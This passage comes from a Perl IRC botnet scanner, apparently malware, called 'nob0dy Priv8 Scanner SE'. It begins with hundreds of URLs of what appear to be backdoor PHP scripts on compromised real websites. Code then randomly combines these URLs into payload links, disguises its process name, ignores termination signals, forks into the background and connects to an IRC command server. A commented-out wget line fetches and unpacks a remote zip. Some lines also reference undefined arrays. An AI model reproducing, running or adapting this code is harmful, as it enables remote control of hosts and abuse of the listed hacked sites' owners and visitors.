"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.allcam.org/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://sufbellman.dk/media/error.php"

);



my $full     = $randombarner[rand(scalar(@randombarner))];



my $full1    = $random1[rand(scalar(@random1))];

my $full2    = $random2[rand(scalar(@random2))];

my $full3    = $random3[rand(scalar(@random3))];

my $full4    = $random4[rand(scalar(@random4))];

my $full5    = $random5[rand(scalar(@random5))];



my $full6    = $random6[rand(scalar(@random6))];

my $full7    = $random7[rand(scalar(@random7))];

my $full8    = $random8[rand(scalar(@random8))];

my $full9    = $random9[rand(scalar(@random9r))];

my $full10   = $random10[rand(scalar(@random10))];



my $full11    = $random1[rand(scalar(@random1))];

my $full12    = $random2[rand(scalar(@random2))];

my $full13    = $random3[rand(scalar(@random3))];

my $full14    = $random4[rand(scalar(@random4))];

my $full15    = $random5[rand(scalar(@random5))];



my $full16    = $random6[rand(scalar(@random6))];

my $full17    = $random7[rand(scalar(@random7))];

my $full18    = $random8[rand(scalar(@random8))];

my $full19    = $random9[rand(scalar(@random9r))];

my $full20   = $random10[rand(scalar(@random10))];



my $full21    = $random1[rand(scalar(@random1))];

my $full22    = $random2[rand(scalar(@random2))];

my $full23    = $random3[rand(scalar(@random3))];

my $full24    = $random4[rand(scalar(@random4))];

my $full25    = $random5[rand(scalar(@random5))];



my $full26    = $random6[rand(scalar(@random6))];

my $full27    = $random7[rand(scalar(@random7))];

my $full28    = $random8[rand(scalar(@random8))];

my $full29    = $random9[rand(scalar(@random9r))];

my $full30   = $random10[rand(scalar(@random10))];







my $jack 		= "".$full.$pgfa."";



my $jack1 		= "".$full1.$pgfa."";

my $jack2 		= "".$full2.$pgfa."";

my $jack3 		= "".$full3.$pgfa."";

my $jack4 		= "".$full4.$pgfa."";

my $jack5  		= "".$full5.$pgfa."";



my $jack6   	= "".$full6.$pgfa."";

my $jack7 		= "".$full7.$pgfa."";

my $jack8  		= "".$full8.$pgfa."";

my $jack9 		= "".$full9.$pgfa."";

my $jack10 		= "".$full10.$pgfa."";



my $jack11 		= "".$full11.$pgfa."";

my $jack12 		= "".$full12.$pgfa."";

my $jack13 		= "".$full13.$pgfa."";

my $jack14 		= "".$full14.$pgfa."";

my $jack15 		= "".$full15.$pgfa."";



my $jack16		= "".$full16.$pgfa."";

my $jack17 		= "".$full17.$pgfa."";

my $jack18 		= "".$full18.$pgfa."";

my $jack19 		= "".$full19.$pgfa."";

my $jack20 		= "".$full20.$pgfa."";



my $jack21		= "".$full21.$pgfa."";

my $jack22 		= "".$full22.$pgfa."";

my $jack23		= "".$full23.$pgfa."";

my $jack24 		= "".$full24.$pgfa."";

my $jack25		= "".$full25.$pgfa."";



my $jack26 		= "".$full26.$pgfa."";

my $jack27 		= "".$full27.$pgfa."";

my $jack28		= "".$full28.$pgfa."";

my $jack29		= "".$full29.$pgfa."";

my $jack30 		= "".$full30.$pgfa."";



my @gantengs	= (".$jack1.",".$jack2.",".$jack3.",".$jack4.",".$jack5.",".$jack6.",".$jack7.",".$jack8.",".$jack9.",".$jack10.",".$jack11.",".$jack12.");

my $best 		= $gantengs[rand(scalar(@gantengs))];

 


if (@ARGV == 7) {
    print "\n[+] nob0dy Priv8 Scanner SE\n".
          "[+] IRC Host    : $ircserver\n".
          "[+] IRC Port    : $ircport\n".
          "[+] Bot Nick    : $nickname\n".
          "[+] Bot Ident   : $ident\n".
          "[+] Channel     : $channel\n".
          "[+] Bot Admin   : $admin\n".
          "[+] Process/PID : $fakeproc - $$\n\n";
}

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

#chop (my $priper = `wget http://pomozwalczyc.pl//wp-content/themes/azolla/cache/id.zip;unzip id.zip;rm id.zip`);
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
